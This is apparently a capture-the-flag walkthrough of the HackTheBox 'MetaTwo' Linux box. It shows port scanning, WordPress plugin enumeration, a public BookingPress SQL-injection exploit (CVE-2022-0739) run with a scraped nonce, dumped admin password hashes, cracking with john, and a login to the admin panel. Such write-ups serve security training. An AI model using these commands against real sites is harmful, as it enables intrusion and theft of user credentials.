# Box: MetaTwo
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A 10.129.228.95 -v -p- -T4```

```
```
From our nmap scan we have 3 open ports, port 21 which runs ftp, port 22 which runs ssh and port 80 which runs http. We'll begin our enumeration today from port 21.



# Enumeration (Port 21)

Lets connect to the ftp server with anonymous login

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2f5531f2-d127-4e1b-b73a-be3969838d44)

oops, anonymous login now allowed.

There's not much to do here, lets move our enumeration to port 80


# Enumeration (Port 80)

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/56f533a2-04c3-4dab-ab6d-dac098d5ee7a)

We'll add that domain name to our ```/etc/hosts``` file, then try to load the webpage again

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/02be7144-38e9-43c2-ba0d-b591152d54fc)

This is a wordpress site

lets fireup our wpscan tool to help us enumerate this webpage for plugins

command:```wpscan --url http://metapress.htb --plugins-detection aggressive -t 60```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6e2f9e52-ca78-4a75-bb88-c1fb1977f00b)

We found 3 plugins, the version for the plugin ```bookingpress-appointment-booking``` actually has a public exploit

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/afdc3fc7-ae76-49fc-83ed-a1bc30ff52e1)

Lets exploit this




# Exploitation

You can download the exploit we'll be using [here](https://github.com/destr4ct/CVE-2022-0739/blob/main/booking-press-expl.py)

Running the exploit

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/metatwo]
└─$ python booking-press-expl.py                                       
- BookingPress PoC
usage: booking-press-expl.py [-h] -u URL -n NONCE
booking-press-expl.py: error: the following arguments are required: -u/--url, -n/--nonce
```
We need to provide the arguments ```--url``` and ```--nonce```, we have the url, but how do we get the nonce??

Navigate to the ```/events``` directory

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a23e6c33-5eba-4842-9b61-f85fba12f1dd)

Lets view the page source

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3e3e5933-82e2-4203-b96a-edf36371f374)

nice nice, we found the nonce, now lets run the exploit again

command:```python booking-press-expl.py -u http://metapress.htb/ -n 2e8c753422```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/metatwo]
└─$ python booking-press-expl.py -u http://metapress.htb/ -n 2e8c753422
- BookingPress PoC
-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
-- Count of users:  2
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
```
Exploiting the SQLi, we were able to dump the db. Lets crack these hashes using john.

Save the hashes in a file say "hash", then we'll use john

command:```john hash --wordlist=/usr/share/wordlists/rockyou.txt```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/metatwo]
└─$ gedit hash            
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/metatwo]
└─$ cat hash             
admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/metatwo]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (manager)     
1g 0:00:09:29 DONE (2023-11-05 14:07) 0.001754g/s 25168p/s 25363c/s 25363C/s !!!@@@!!!..*7¡Vamos!
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 
```

Lets login with the creds

username:```manager```        password:```partylikearockstar```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3f77ff3a-dc63-455b-94d8-c6860a8cc74f)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cc06e7e4-5bbc-4053-a229-900f59ef4a52)

We are logged in
































